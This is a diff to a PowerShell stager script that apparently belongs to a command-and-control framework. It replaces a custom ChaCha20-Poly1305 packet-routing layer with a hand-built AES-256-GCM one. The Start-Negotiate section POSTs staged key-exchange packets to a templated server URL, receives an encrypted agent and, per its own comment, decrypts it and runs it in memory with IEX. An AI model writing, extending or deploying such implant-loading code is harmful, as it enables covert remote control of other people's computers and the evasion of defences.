@@ -396,201 +396,145 @@ function checkvalid {
 
 $Script:pk = {{ agent_public_cert_key }}
 
-$ChaChaSrc = @"
+$AesGcmSrc = @"
 using System;
+using System.Security.Cryptography;
 
-public static class ChaCha20Poly1305Ref
+public static class AesGcmHelper
 {
-    const int ROUNDS = 20;
-
-    static uint ROTL(uint v, int c) { return (v << c) | (v >> (32 - c)); }
-
-    static void QuarterRound(ref uint a, ref uint b, ref uint c, ref uint d)
+    // AES-ECB encrypt a single 16-byte block (used as GCM building block)
+    static byte[] AesBlock(byte[] key, byte[] block)
     {
-        a += b; d ^= a; d = ROTL(d, 16);
-        c += d; b ^= c; b = ROTL(b, 12);
-        a += b; d ^= a; d = ROTL(d, 8);
-        c += d; b ^= c; b = ROTL(b, 7);
+        using (var aes = new AesCryptoServiceProvider())
+        {
+            aes.Mode = CipherMode.ECB;
+            aes.Padding = PaddingMode.None;
+            aes.Key = key;
+            using (var enc = aes.CreateEncryptor())
+                return enc.TransformFinalBlock(block, 0, 16);
+        }
     }
 
-    static void U32To(byte[] dst, int off, uint v)
+    // Increment the rightmost 32 bits of a 16-byte counter block
+    static void Inc32(byte[] cb)
     {
-        dst[off+0] = (byte)v;
-        dst[off+1] = (byte)(v >> 8);
-        dst[off+2] = (byte)(v >> 16);
-        dst[off+3] = (byte)(v >> 24);
-    }
-
-    static void ChaChaBlock(byte[] key, uint counter, byte[] nonce, byte[] output) {
-        uint[] s = new uint[16];
-        s[0]=0x61707865; s[1]=0x3320646e; s[2]=0x79622d32; s[3]=0x6b206574;
-        for (int i=0;i<8;i++) s[4+i] = U32(key, i*4);
-        s[12]=counter;
-        for (int i=0;i<3;i++) s[13+i] = U32(nonce, i*4);
-
-        uint[] x = new uint[16];
-        Array.Copy(s, x, 16);
-
-        for (int i=0; i<ROUNDS; i+=2) {
-            QuarterRound(ref x[0], ref x[4], ref x[8], ref x[12]);
-            QuarterRound(ref x[1], ref x[5], ref x[9], ref x[13]);
-            QuarterRound(ref x[2], ref x[6], ref x[10], ref x[14]);
-            QuarterRound(ref x[3], ref x[7], ref x[11], ref x[15]);
-
-            QuarterRound(ref x[0], ref x[5], ref x[10], ref x[15]);
-            QuarterRound(ref x[1], ref x[6], ref x[11], ref x[12]);
-            QuarterRound(ref x[2], ref x[7], ref x[8], ref x[13]);
-            QuarterRound(ref x[3], ref x[4], ref x[9], ref x[14]);
-        }
-
-        for (int i=0;i<16;i++){
-            uint v = x[i] + s[i];
-            U32To(output, i*4, v);
+        for (int i = 15; i >= 12; i--)
+        {
+            if (++cb[i] != 0) break;
         }
     }
 
-    static void KeyStream(byte[] key, uint counter, byte[] nonce, byte[] dst) {
-        byte[] block = new byte[64];
-        int off=0;
-        uint ctr = counter;
-        while (off < dst.Length) {
-            ChaChaBlock(key, ctr++, nonce, block);
-            int n = Math.Min(64, dst.Length-off);
-            Array.Copy(block, 0, dst, off, n);
-            off += n;
-        }
-    }
-
-    // Little-endian 32-bit load (safe)
-    static uint LE32(byte[] b, int o) { return U32(b,o); }
-
-    // Poly1305 tag over msg using one-time key 'otk' (32 bytes)
-    static uint U32(byte[] b, int i) { return BitConverter.ToUInt32(b, i); }
-
-    static void PolyClamp(byte[] r) {
-        r[3]  &= 15;  r[7]  &= 15;  r[11] &= 15;  r[15] &= 15;
-        r[4]  &= 252; r[8]  &= 252; r[12] &= 252;
-    }
-
-    static void Poly1305Tag(byte[] key, byte[] msg, byte[] tag) {
-        var r = new byte[16];
-        var s = new byte[16];
-        Buffer.BlockCopy(key, 0,  r, 0, 16);
-        Buffer.BlockCopy(key, 16, s, 0, 16);
-        PolyClamp(r);
-
-        // r as 26-bit limbs
-        ulong r0 =  U32(r, 0)        & 0x3ffffffUL;
-        ulong r1 = (U32(r, 3) >> 2)  & 0x3ffffffUL;
-        ulong r2 = (U32(r, 6) >> 4)  & 0x3ffffffUL;
-        ulong r3 = (U32(r, 9) >> 6)  & 0x3ffffffUL;
-        ulong r4 = (U32(r,12) >> 8)  & 0x3ffffffUL;
-
-        ulong s1 = r1 * 5, s2 = r2 * 5, s3 = r3 * 5, s4 = r4 * 5;
-        ulong h0=0,h1=0,h2=0,h3=0,h4=0;
-
+    // GCTR: AES-CTR encryption/decryption
+    static byte[] GCTR(byte[] key, byte[] icb, byte[] input)
+    {
+        if (input == null || input.Length == 0) return new byte[0];
+        byte[] output = new byte[input.Length];
+        byte[] cb = (byte[])icb.Clone();
         int off = 0;
-        while (off < msg.Length) {
-            int n = Math.Min(16, msg.Length - off);
-            var block = new byte[16];                    // zero padded by default
-            Buffer.BlockCopy(msg, off, block, 0, n);
+        while (off < input.Length)
+        {
+            byte[] ks = AesBlock(key, cb);
+            int n = Math.Min(16, input.Length - off);
+            for (int i = 0; i < n; i++)
+                output[off + i] = (byte)(input[off + i] ^ ks[i]);
             off += n;
-
-            // m as 26-bit limbs (+ hibit in t4)
-            ulong t0 =  U32(block, 0)        & 0x3ffffffUL;
-            ulong t1 = (U32(block, 3) >> 2)  & 0x3ffffffUL;
-            ulong t2 = (U32(block, 6) >> 4)  & 0x3ffffffUL;
-            ulong t3 = (U32(block, 9) >> 6)  & 0x3ffffffUL;
-            ulong t4 = ((U32(block,12) >> 8) | (1u << 24)) & 0x3ffffffUL;
-
-            h0 += t0; h1 += t1; h2 += t2; h3 += t3; h4 += t4;
-
-            ulong d0 = h0*r0 + h1*s4 + h2*s3 + h3*s2 + h4*s1;
-            ulong d1 = h0*r1 + h1*r0 + h2*s4 + h3*s3 + h4*s2;
-            ulong d2 = h0*r2 + h1*r1 + h2*r0 + h3*s4 + h4*s3;
-            ulong d3 = h0*r3 + h1*r2 + h2*r1 + h3*r0 + h4*s4;
-            ulong d4 = h0*r4 + h1*r3 + h2*r2 + h3*r1 + h4*r0;
-
-            // carry propagate
-            ulong c = (d0 >> 26); h0 = d0 & 0x3ffffffUL; d1 += c;
-            c = (d1 >> 26); h1 = d1 & 0x3ffffffUL; d2 += c;
-            c = (d2 >> 26); h2 = d2 & 0x3ffffffUL; d3 += c;
-            c = (d3 >> 26); h3 = d3 & 0x3ffffffUL; d4 += c;
-            c = (d4 >> 26); h4 = d4 & 0x3ffffffUL; h0 += c * 5;
-            c = (h0 >> 26); h0 &= 0x3ffffffUL; h1 += c;
+            Inc32(cb);
         }
-
-        // Compute h + -p and select
-        ulong g0 = h0 + 5; ulong c2 = g0 >> 26; g0 &= 0x3ffffffUL;
-        ulong g1 = h1 + c2; c2 = g1 >> 26; g1 &= 0x3ffffffUL;
-        ulong g2 = h2 + c2; c2 = g2 >> 26; g2 &= 0x3ffffffUL;
-        ulong g3 = h3 + c2; c2 = g3 >> 26; g3 &= 0x3ffffffUL;
-        ulong g4 = h4 + c2 - (1UL<<26);
-
-        ulong mask = (g4 >> 63) - 1;
-        h0 = (h0 & ~mask) | (g0 & mask);
-        h1 = (h1 & ~mask) | (g1 & mask);
-        h2 = (h2 & ~mask) | (g2 & mask);
-        h3 = (h3 & ~mask) | (g3 & mask);
-        h4 = (h4 & ~mask) | (g4 & mask);
-
-        // Pack into 128 bits (little-endian) using ALL four f-values
-        ulong f0 = (h0      ) | (h1 << 26);
-        ulong f1 = (h1 >> 6 ) | (h2 << 20);
-        ulong f2 = (h2 >> 12) | (h3 << 14);
-        ulong f3 = (h3 >> 18) | (h4 << 8 );
-
-        ulong lo = ((ulong)(uint)f0) | (((ulong)(uint)f1) << 32);
-        ulong hi = ((ulong)(uint)f2) | (((ulong)(uint)f3) << 32);
-
-        // Add s (rfc: tag = (acc + s) mod 2^128)
-        ulong s0 = BitConverter.ToUInt64(s, 0);
-        ulong s11 = BitConverter.ToUInt64(s, 8);
-        lo += s0;
-        hi += s11 + ((lo < s0) ? 1UL : 0UL);
-
-        var tb = new byte[16];
-        Array.Copy(BitConverter.GetBytes(lo), 0, tb, 0, 8);
-        Array.Copy(BitConverter.GetBytes(hi), 0, tb, 8, 8);
-        Buffer.BlockCopy(tb, 0, tag, 0, 16);
+        return output;
     }
 
-    static byte[] Pad16(int len)
+    // GF(2^128) multiplication for GHASH
+    static void GfMul(byte[] x, byte[] y, byte[] result)
     {
-        int pad = (16 - (len % 16)) % 16;
-        return new byte[pad];
+        byte[] v = (byte[])y.Clone();
+        byte[] z = new byte[16];
+        for (int i = 0; i < 128; i++)
+        {
+            if ((x[i / 8] & (1 << (7 - (i % 8)))) != 0)
+            {
+                for (int j = 0; j < 16; j++) z[j] ^= v[j];
+            }
+            bool lsb = (v[15] & 1) != 0;
+            // Right shift v by 1
+            for (int j = 15; j > 0; j--)
+                v[j] = (byte)((v[j] >> 1) | ((v[j - 1] & 1) << 7));
+            v[0] >>= 1;
+            if (lsb) v[0] ^= 0xE1; // R = 0xE1 || 0^120
+        }
+        Array.Copy(z, result, 16);
+    }
+
+    // GHASH: hash AAD and ciphertext with subkey H
+    static byte[] GHASH(byte[] h, byte[] aad, byte[] ct)
+    {
+        byte[] y = new byte[16];
+        byte[] tmp = new byte[16];
+
+        // Process AAD blocks
+        int i;
+        for (i = 0; i + 16 <= aad.Length; i += 16)
+        {
+            for (int j = 0; j < 16; j++) y[j] ^= aad[i + j];
+            GfMul(y, h, tmp); Array.Copy(tmp, y, 16);
+        }
+        if (i < aad.Length)
+        {
+            byte[] pad = new byte[16];
+            Array.Copy(aad, i, pad, 0, aad.Length - i);
+            for (int j = 0; j < 16; j++) y[j] ^= pad[j];
+            GfMul(y, h, tmp); Array.Copy(tmp, y, 16);
+        }
+
+        // Process ciphertext blocks
+        for (i = 0; i + 16 <= ct.Length; i += 16)
+        {
+            for (int j = 0; j < 16; j++) y[j] ^= ct[i + j];
+            GfMul(y, h, tmp); Array.Copy(tmp, y, 16);
+        }
+        if (i < ct.Length)
+        {
+            byte[] pad = new byte[16];
+            Array.Copy(ct, i, pad, 0, ct.Length - i);
+            for (int j = 0; j < 16; j++) y[j] ^= pad[j];
+            GfMul(y, h, tmp); Array.Copy(tmp, y, 16);
+        }
+
+        // Length block: bits of AAD || bits of CT (big-endian 64-bit each)
+        byte[] lenBlock = new byte[16];
+        ulong aadBits = (ulong)aad.Length * 8;
+        ulong ctBits = (ulong)ct.Length * 8;
+        for (int b = 0; b < 8; b++)
+        {
+            lenBlock[7 - b] = (byte)(aadBits & 0xFF); aadBits >>= 8;
+            lenBlock[15 - b] = (byte)(ctBits & 0xFF); ctBits >>= 8;
+        }
+        for (int j = 0; j < 16; j++) y[j] ^= lenBlock[j];
+        GfMul(y, h, tmp);
+
+        return tmp;
     }
 
     public static byte[] Seal(byte[] key, byte[] nonce, byte[] pt, byte[] aad)
     {
-        if (key == null || key.Length != 32) throw new ArgumentException("key 32B");
-        if (nonce == null || nonce.Length != 12) throw new ArgumentException("nonce 12B");
+        if (key == null || key.Length != 32) throw new ArgumentException("key must be 32 bytes");
+        if (nonce == null || nonce.Length != 12) throw new ArgumentException("nonce must be 12 bytes");
         if (aad == null) aad = new byte[0];
 
-        // Encrypt: keystream with counter=1
-        byte[] ks = new byte[pt.Length];
-        KeyStream(key, 1, nonce, ks);
-        byte[] ct = new byte[pt.Length];
-        for (int i=0;i<pt.Length;i++) ct[i] = (byte)(pt[i] ^ ks[i]);
+        // H = AES_K(0^128)
+        byte[] h = AesBlock(key, new byte[16]);
 
-        // Poly key: counter=0
-        byte[] otk = new byte[32];
-        KeyStream(key, 0, nonce, otk);
+        // J0 = nonce || 0x00000001
+        byte[] j0 = new byte[16];
+        Array.Copy(nonce, 0, j0, 0, 12);
+        j0[15] = 1;
 
-        // MAC data per RFC: aad || pad16(aad) || ct || pad16(ct) || LE64(len(aad)) || LE64(len(ct))
-        byte[] aPad = Pad16(aad.Length);
-        byte[] cPad = Pad16(ct.Length);
-        byte[] mac = new byte[aad.Length + aPad.Length + ct.Length + cPad.Length + 16];
-        int off=0;
-        Array.Copy(aad, 0, mac, off, aad.Length); off += aad.Length;
-        Array.Copy(aPad, 0, mac, off, aPad.Length); off += aPad.Length;
-        Array.Copy(ct, 0, mac, off, ct.Length); off += ct.Length;
-        Array.Copy(cPad, 0, mac, off, cPad.Length); off += cPad.Length;
-        Array.Copy(BitConverter.GetBytes((ulong)aad.Length), 0, mac, off, 8); off += 8;
-        Array.Copy(BitConverter.GetBytes((ulong)ct.Length), 0, mac, off, 8);
+        // ICB = J0 + 1 for encryption
+        byte[] icb = (byte[])j0.Clone();
+        Inc32(icb);
 
-        byte[] tag = new byte[16];
-        Poly1305Tag(otk, mac, tag);
+        byte[] ct = GCTR(key, icb, pt);
+        byte[] s = GHASH(h, aad, ct);
+        byte[] tag = GCTR(key, j0, s);
 
         byte[] outBuf = new byte[ct.Length + 16];
         Array.Copy(ct, 0, outBuf, 0, ct.Length);
@@ -600,9 +544,9 @@ public static class ChaCha20Poly1305Ref
 
     public static byte[] Open(byte[] key, byte[] nonce, byte[] ct_and_tag, byte[] aad)
     {
-        if (key == null || key.Length != 32) throw new ArgumentException("key 32B");
-        if (nonce == null || nonce.Length != 12) throw new ArgumentException("nonce 12B");
-        if (ct_and_tag == null || ct_and_tag.Length < 16) throw new ArgumentException("ct too short");
+        if (key == null || key.Length != 32) throw new ArgumentException("key must be 32 bytes");
+        if (nonce == null || nonce.Length != 12) throw new ArgumentException("nonce must be 12 bytes");
+        if (ct_and_tag == null || ct_and_tag.Length < 16) throw new ArgumentException("ciphertext too short");
         if (aad == null) aad = new byte[0];
 
         int ctLen = ct_and_tag.Length - 16;
@@ -611,32 +555,23 @@ public static class ChaCha20Poly1305Ref
         Array.Copy(ct_and_tag, 0, ct, 0, ctLen);
         Array.Copy(ct_and_tag, ctLen, tag, 0, 16);
 
-        byte[] otk = new byte[32];
-        KeyStream(key, 0, nonce, otk);
+        byte[] h = AesBlock(key, new byte[16]);
 
-        byte[] aPad = Pad16(aad.Length);
-        byte[] cPad = Pad16(ct.Length);
-        byte[] mac = new byte[aad.Length + aPad.Length + ct.Length + cPad.Length + 16];
-        int off=0;
-        Array.Copy(aad, 0, mac, off, aad.Length); off += aad.Length;
-        Array.Copy(aPad, 0, mac, off, aPad.Length); off += aPad.Length;
-        Array.Copy(ct, 0, mac, off, ct.Length); off += ct.Length;
-        Array.Copy(cPad, 0, mac, off, cPad.Length); off += cPad.Length;
-        Array.Copy(BitConverter.GetBytes((ulong)aad.Length), 0, mac, off, 8); off += 8;
-        Array.Copy(BitConverter.GetBytes((ulong)ct.Length), 0, mac, off, 8);
+        byte[] j0 = new byte[16];
+        Array.Copy(nonce, 0, j0, 0, 12);
+        j0[15] = 1;
 
-        byte[] calc = new byte[16];
-        Poly1305Tag(otk, mac, calc);
+        byte[] s = GHASH(h, aad, ct);
+        byte[] expectedTag = GCTR(key, j0, s);
 
+        // Constant-time tag comparison
         int diff = 0;
-        for (int i=0;i<16;i++) diff |= (calc[i] ^ tag[i]);
-        if (diff != 0) throw new Exception("tag mismatch");
+        for (int i = 0; i < 16; i++) diff |= (expectedTag[i] ^ tag[i]);
+        if (diff != 0) throw new Exception("AES-GCM authentication tag mismatch");
 
-        byte[] ks = new byte[ct.Length];
-        KeyStream(key, 1, nonce, ks);
-        byte[] pt = new byte[ct.Length];
-        for (int i=0;i<ct.Length;i++) pt[i] = (byte)(ct[i] ^ ks[i]);
-        return pt;
+        byte[] icb = (byte[])j0.Clone();
+        Inc32(icb);
+        return GCTR(key, icb, ct);
     }
 }
 "@
@@ -734,7 +669,7 @@ public class DiffieHellman
 "@
 
 # compile first; stop on errors so you actually see them
-$null = Add-Type -TypeDefinition $ChaChaSrc -Language CSharp -ErrorAction Stop
+$null = Add-Type -TypeDefinition $AesGcmSrc -Language CSharp -ErrorAction Stop
 $refs = @("System.Numerics")
 $null = Add-Type -TypeDefinition $DiffieHellman -Language CSharp -ReferencedAssemblies $refs -ErrorAction Stop
 
@@ -764,8 +699,8 @@ function Normalize-Key([byte[]]$kb){
     return $sha.ComputeHash($kb)
 }
 
-# Build a ChaCha20-Poly1305 routing packet (nonce || AEAD(header) || encData)
-function Build-ChaChaRoutingPacket {
+# Build an AES-256-GCM routing packet (iv || AEAD(header) || encData)
+function Build-RoutingPacket {
     param(
         [byte[]]$StagingKeyBytes,
         [string] $SessionId8,
@@ -775,7 +710,7 @@ function Build-ChaChaRoutingPacket {
         [byte[]] $EncData = @()
     )
     $key   = Normalize-Key $StagingKeyBytes
-    $nonce = Get-CryptoRandomBytes 12
+    $iv = Get-CryptoRandomBytes 12
 
     $sid = [System.Text.Encoding]::ASCII.GetBytes($SessionId8)
     $hdr = New-Object byte[] 16
@@ -786,12 +721,12 @@ function Build-ChaChaRoutingPacket {
     $hdr[11] = [byte](($Additional -shr 8) -band 0xFF)
     [BitConverter]::GetBytes([UInt32]$EncData.Length).CopyTo($hdr,12)
 
-    $encHeader = [ChaCha20Poly1305Ref]::Seal($key, $nonce, $hdr, [byte[]]@())
-    return $nonce + $encHeader + $EncData
+    $encHeader = [AesGcmHelper]::Seal($key, $iv, $hdr, [byte[]]@())
+    return $iv + $encHeader + $EncData
 }
 
-# Decode ChaCha routing packets -> { sessionId : @(lang, meta, additional, encData) }
-function Decode-ChaChaRoutingPacket {
+# Decode AES-256-GCM routing packets -> { sessionId : @(lang, meta, additional, encData) }
+function Parse-RoutingPacket {
     param(
         [Alias('PacketData')]
         [Parameter(Mandatory)]$RawData,
@@ -807,14 +742,14 @@ function Decode-ChaChaRoutingPacket {
     $out = @{}
 
     while (($RawData.Length - $i) -ge 44) {
-        $nonce = [byte[]]::new(12)
-        [Buffer]::BlockCopy($RawData, $i, $nonce, 0, 12)
+        $iv = [byte[]]::new(12)
+        [Buffer]::BlockCopy($RawData, $i, $iv, 0, 12)
 
         $aead = [byte[]]::new(32)  # 16B enc header + 16B tag
         [Buffer]::BlockCopy($RawData, $i + 12, $aead, 0, 32)
 
         try {
-            $plain = [ChaCha20Poly1305Ref]::Open($key, $nonce, $aead, [byte[]]@())
+            $plain = [AesGcmHelper]::Open($key, $iv, $aead, [byte[]]@())
         } catch {
             break
         }
@@ -1039,12 +974,12 @@ function Start-Negotiate {
     # session id (8 bytes ASCII)
     $ID='00000000'
 
-    # stage_1: ChaCha20-Poly1305 routing with AES/HMAC body
-    $chachaPkt = Build-ChaChaRoutingPacket -StagingKeyBytes $SKB -SessionId8 $ID -Language 1 -Meta 2 -Additional 0 -EncData $eb
-    $raw = $wc.UploadData($s + "/{{ stage_1 }}", "POST", $chachaPkt)
+    # stage_1: AES-256-GCM routing with AES/HMAC body
+    $routingPkt = Build-RoutingPacket -StagingKeyBytes $SKB -SessionId8 $ID -Language 1 -Meta 2 -Additional 0 -EncData $eb
+    $raw = $wc.UploadData($s + "/{{ stage_1 }}", "POST", $routingPkt)
 
     # parse routing
-    $pktMap = Decode-ChaChaRoutingPacket -RawData $raw -StagingKeyBytes $SKB
+    $pktMap = Parse-RoutingPacket -RawData $raw -StagingKeyBytes $SKB
     if(-not $pktMap){ return }
 
     # Take the session id the server actually used and adopt it
@@ -1121,12 +1056,12 @@ function Start-Negotiate {
     $wc.Headers.Add("User-Agent",$UA);
     $wc.Headers.Add("Hop-Name",$hop);
 
-    # stage_2: ChaCha20-Poly1305 routing with AES/HMAC(SessionKey) body
-    $chachaPkt2 = Build-ChaChaRoutingPacket -StagingKeyBytes $SKB -SessionId8 $ID -Language 1 -Meta 3 -Additional 0 -EncData $eb2
-    $raw2 = $wc.UploadData($s + "/{{ stage_2 }}", "POST", $chachaPkt2)
+    # stage_2: AES-256-GCM routing with AES/HMAC(SessionKey) body
+    $routingPkt2 = Build-RoutingPacket -StagingKeyBytes $SKB -SessionId8 $ID -Language 1 -Meta 3 -Additional 0 -EncData $eb2
+    $raw2 = $wc.UploadData($s + "/{{ stage_2 }}", "POST", $routingPkt2)
 
     # receive agent, decrypt with SessionKey, IEX
-    $pktMap2 = Decode-ChaChaRoutingPacket -RawData $raw2 -StagingKeyBytes $SKB
+    $pktMap2 = Parse-RoutingPacket -RawData $raw2 -StagingKeyBytes $SKB
     if(-not $pktMap2){ return }
     $fields2 = $pktMap2[$ID]; if(-not $fields2){ $firstKey = $pktMap2.Keys | Select-Object -First 1; $fields2 = $pktMap2[$firstKey] }
     $agentEnc = [byte[]]$fields2[3]
